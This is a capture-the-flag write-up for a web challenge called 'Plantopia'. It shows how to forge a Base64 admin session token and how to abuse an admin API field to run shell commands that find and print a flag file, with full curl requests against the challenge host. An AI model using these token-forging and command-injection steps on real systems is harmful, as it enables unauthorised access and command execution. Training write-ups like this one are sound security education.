# Plantopia

## Description

<small>Author: @HuskyHacks</small><br><br>Plantopia is our brand new, cutting edge plant care management website! Built for hobbiests and professionals alike, it's your one stop shop for all plant care management. <br><br> Please perform a penetration test ahead of our site launch and let us know if you find anything.
<br><br> Username: <code>testuser</code>
<br> Password: <code>testpassword</code>
<br><br> <b>Press the <code>Start</code> button on the top-right to begin this challenge.</b>


## Solution

This was a live-service web-app that is vulnerable to session forging due to a weak session token value.

The session token is simply Base64 encoded, meaning you can forge your own very easily.

Here is an example token:
```
emit testuser.0.1729632199 |r.b64 -R
dGVzdHVzZXIuMC4xNzI5NjMyMTk5
```

You can create an administrative token by manipulating the user and/or the boolean value in between the `.` characters:

```
emit admin.1.1729632346| r.b64 -R
YWRtaW4uMS4xNzI5NjMyMzQ2
```

The service exposes an API that lets admins run arbitrary commands attached to certain plants, and then read the logs which display the command output of those commands.

We can get the flag with two JSON payloads sent to the API, and 3 curl commands:

Payload 1, update a plant:
```json
{
  "description": "A beautiful sunflower.",
  "sunlight_level": 1,
  "watering_threshold": 1,
  "alert_command": "whoami;find / -name flag.txt 2>/dev/null -exec cat {} \\;"
}
```

Send the payload via the following command:
```
curl -X 'POST' 'http://challenge.ctf.games:31332/api/plants/1/edit' -H 'Content-Type: application/json' -H 'Authorization: YWRtaW4uMS4xNzI5NjMyMzQ2' --data @payload.json
```

We then need to trigger the payload using a separate API endpoint that accepts a plant ID to trigger the command for:

Payload 2:
```json
{
  "plant_id": 1
}
```

Send the payload:
```
curl -X 'POST' 'http://challenge.ctf.games:31332/api/admin/sendmail' -H 'Content-Type: application/json' -H 'Authorization: YWRtaW4uMS4xNzI5NjMyMzQ2' --data @payload2.json
```

Finally, we can read the logs and get the flag from the logs:
```
curl -X 'GET' 'http://challenge.ctf.games:31332/api/admin/logs' -H 'accept: application/json' -H 'Authorization: YWRtaW4uMS4xNzI5NjMyMzQ2' 
```